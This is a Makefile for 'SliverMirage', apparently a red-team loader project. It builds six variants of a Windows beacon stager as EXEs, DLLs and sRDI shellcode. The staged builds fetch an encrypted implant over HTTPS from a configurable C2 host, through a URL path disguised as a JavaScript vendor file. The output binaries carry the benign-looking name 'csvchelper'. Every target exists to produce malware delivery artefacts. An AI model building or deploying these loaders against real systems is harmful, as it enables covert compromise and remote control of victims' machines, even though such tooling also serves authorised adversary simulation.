# SliverMirage Makefile — 6 beacon variants
#
# Targets:
#   exe               Staged EXE (HTTPS download, default)
#   exe-stageless     Stageless EXE (embedded payload)
#   dll               Stageless DLL (embedded payload)
#   dll-staged        Staged DLL (HTTPS download)
#   shellcode         Staged shellcode (sRDI from staged DLL)
#   shellcode-stageless  Stageless shellcode (sRDI from stageless DLL)
#
# Usage:
#   make PICO=/path/to/implant.crystal.bin C2_HOST=10.0.0.1
#   make exe-stageless PICO=/path/to/implant.crystal.bin
#   make dll PICO=/path/to/implant.crystal.bin

CC      := x86_64-w64-mingw32-gcc
WINDRES := x86_64-w64-mingw32-windres
CFLAGS  := -Wall -Os -mwindows -ffunction-sections -fdata-sections
LDFLAGS := -s -Wl,--gc-sections -ladvapi32 -lbcrypt

PICO    ?= $(error PICO is not set — run: make PICO=/path/to/implant.crystal.bin)
C2_HOST ?= 127.0.0.1
C2_PORT ?= 443
C2_PATH ?= /assets/js/vendor.js
EXPORT  ?=

SRCDIR  := src
SCRIPTS := scripts
RESDIR  := resources
BUILDDIR:= build

.PHONY: all exe exe-stageless dll dll-staged shellcode shellcode-stageless clean

all: exe

# ── Generated headers ────────────────────────────────────────────────────

$(SRCDIR)/payload_key.h: $(PICO) $(SCRIPTS)/gen_payload.py
	@mkdir -p $(BUILDDIR)
	python3 $(SCRIPTS)/gen_payload.py "$(abspath $(PICO))" \
		"$(abspath $(BUILDDIR)/payload.dat)" \
		"$(abspath $(SRCDIR)/payload_key.h)"

$(SRCDIR)/payload_stageless.h: $(PICO) $(SCRIPTS)/gen_payload_stageless.py
	python3 $(SCRIPTS)/gen_payload_stageless.py "$(abspath $(PICO))" \
		"$(abspath $(SRCDIR)/payload_stageless.h)"

# ── Resource objects ─────────────────────────────────────────────────────

$(BUILDDIR)/resource.o: $(RESDIR)/resource.rc $(RESDIR)/manifest.xml
	@mkdir -p $(BUILDDIR)
	$(WINDRES) -I $(RESDIR) $(RESDIR)/resource.rc -o $@

$(BUILDDIR)/resource_dll.o: $(RESDIR)/resource_dll.rc $(RESDIR)/manifest.xml
	@mkdir -p $(BUILDDIR)
	$(WINDRES) -I $(RESDIR) $(RESDIR)/resource_dll.rc -o $@

# ══════════════════════════════════════════════════════════════════════════
# Target: exe (staged EXE — HTTPS download)
# ══════════════════════════════════════════════════════════════════════════

exe: $(BUILDDIR)/csvchelper.exe
	@echo ""
	@echo "[+] Staged EXE built:"
	@echo "      $(abspath $(BUILDDIR)/csvchelper.exe)"
	@echo "      $(abspath $(BUILDDIR)/payload.dat)"

$(BUILDDIR)/csvchelper.exe: $(SRCDIR)/stager_remote.c $(SRCDIR)/payload_key.h $(BUILDDIR)/resource.o
	@mkdir -p $(BUILDDIR)
	$(CC) $(CFLAGS) \
		-DC2_HOST_STR=\"$(C2_HOST)\" -DC2_PORT_NUM=$(C2_PORT) -DC2_PATH_STR=\"$(C2_PATH)\" \
		-I $(SRCDIR) -o $@ $< $(BUILDDIR)/resource.o $(LDFLAGS) -lwinhttp

# ══════════════════════════════════════════════════════════════════════════
# Target: exe-stageless (stageless EXE — embedded payload)
# ══════════════════════════════════════════════════════════════════════════

exe-stageless: $(BUILDDIR)/csvchelper_stageless.exe
	@echo ""
	@echo "[+] Stageless EXE built (single file, no payload.dat needed):"
	@echo "      $(abspath $(BUILDDIR)/csvchelper_stageless.exe)"

$(BUILDDIR)/csvchelper_stageless.exe: $(SRCDIR)/stager_stageless.c $(SRCDIR)/payload_stageless.h $(BUILDDIR)/resource.o
	@mkdir -p $(BUILDDIR)
	$(CC) $(CFLAGS) -I $(SRCDIR) -o $@ $< $(BUILDDIR)/resource.o $(LDFLAGS)

# ══════════════════════════════════════════════════════════════════════════
# Target: dll (stageless DLL — embedded payload)
# ══════════════════════════════════════════════════════════════════════════

dll: $(BUILDDIR)/csvchelper.dll
	@echo ""
	@echo "[+] Stageless DLL built (single file):"
	@echo "      $(abspath $(BUILDDIR)/csvchelper.dll)"

$(BUILDDIR)/csvchelper.dll: $(SRCDIR)/stager_stageless_dll.c $(SRCDIR)/payload_stageless.h $(BUILDDIR)/resource_dll.o
	@mkdir -p $(BUILDDIR)
	$(CC) $(CFLAGS) -shared \
		$(if $(EXPORT),-DCUSTOM_EXPORT=\"$(EXPORT)\",) \
		-I $(SRCDIR) -o $@ $< $(BUILDDIR)/resource_dll.o $(LDFLAGS)

# ══════════════════════════════════════════════════════════════════════════
# Target: dll-staged (staged DLL — HTTPS download)
# ══════════════════════════════════════════════════════════════════════════

dll-staged: $(BUILDDIR)/csvchelper_staged.dll
	@echo ""
	@echo "[+] Staged DLL built:"
	@echo "      $(abspath $(BUILDDIR)/csvchelper_staged.dll)"
	@echo "      $(abspath $(BUILDDIR)/payload.dat)"

$(BUILDDIR)/csvchelper_staged.dll: $(SRCDIR)/stager_remote_dll.c $(SRCDIR)/payload_key.h $(BUILDDIR)/resource_dll.o
	@mkdir -p $(BUILDDIR)
	$(CC) $(CFLAGS) -shared \
		-DC2_HOST_STR=\"$(C2_HOST)\" -DC2_PORT_NUM=$(C2_PORT) -DC2_PATH_STR=\"$(C2_PATH)\" \
		$(if $(EXPORT),-DCUSTOM_EXPORT=\"$(EXPORT)\",) \
		-I $(SRCDIR) -o $@ $< $(BUILDDIR)/resource_dll.o $(LDFLAGS) -lwinhttp

# ══════════════════════════════════════════════════════════════════════════
# Target: shellcode (staged — sRDI from staged DLL)
# ══════════════════════════════════════════════════════════════════════════

shellcode: $(BUILDDIR)/csvchelper.bin
	@echo ""
	@echo "[+] Staged shellcode built:"
	@echo "      $(abspath $(BUILDDIR)/csvchelper.bin)"
	@echo "      $(abspath $(BUILDDIR)/payload.dat)"

$(BUILDDIR)/csvchelper.bin: $(BUILDDIR)/csvchelper_staged.dll
	python3 $(SCRIPTS)/dll_to_shellcode.py \
		"$(abspath $(BUILDDIR)/csvchelper_staged.dll)" \
		"$(abspath $@)" \
		$(if $(EXPORT),--export $(EXPORT),)

# ══════════════════════════════════════════════════════════════════════════
# Target: shellcode-stageless (sRDI from stageless DLL)
# ══════════════════════════════════════════════════════════════════════════

shellcode-stageless: $(BUILDDIR)/csvchelper_stageless.bin
	@echo ""
	@echo "[+] Stageless shellcode built (single file):"
	@echo "      $(abspath $(BUILDDIR)/csvchelper_stageless.bin)"

$(BUILDDIR)/csvchelper_stageless.bin: $(BUILDDIR)/csvchelper.dll
	python3 $(SCRIPTS)/dll_to_shellcode.py \
		"$(abspath $(BUILDDIR)/csvchelper.dll)" \
		"$(abspath $@)" \
		$(if $(EXPORT),--export $(EXPORT),)

# ── Debug target ─────────────────────────────────────────────────────────

debug: $(BUILDDIR)/csvchelper_debug.exe
	@echo ""
	@echo "[+] Debug EXE built:"
	@echo "      $(abspath $(BUILDDIR)/csvchelper_debug.exe)"

$(BUILDDIR)/csvchelper_debug.exe: $(SRCDIR)/stager_debug.c $(SRCDIR)/payload_key.h $(BUILDDIR)/resource.o
	@mkdir -p $(BUILDDIR)
	$(CC) $(CFLAGS) \
		-DC2_HOST_STR=\"$(C2_HOST)\" -DC2_PORT_NUM=$(C2_PORT) -DC2_PATH_STR=\"$(C2_PATH)\" \
		-I $(SRCDIR) -o $@ $< $(BUILDDIR)/resource.o $(LDFLAGS) -lwinhttp

# ── Clean ────────────────────────────────────────────────────────────────

clean:
	rm -f $(SRCDIR)/payload_key.h $(SRCDIR)/payload_stageless.h
	rm -rf $(BUILDDIR)
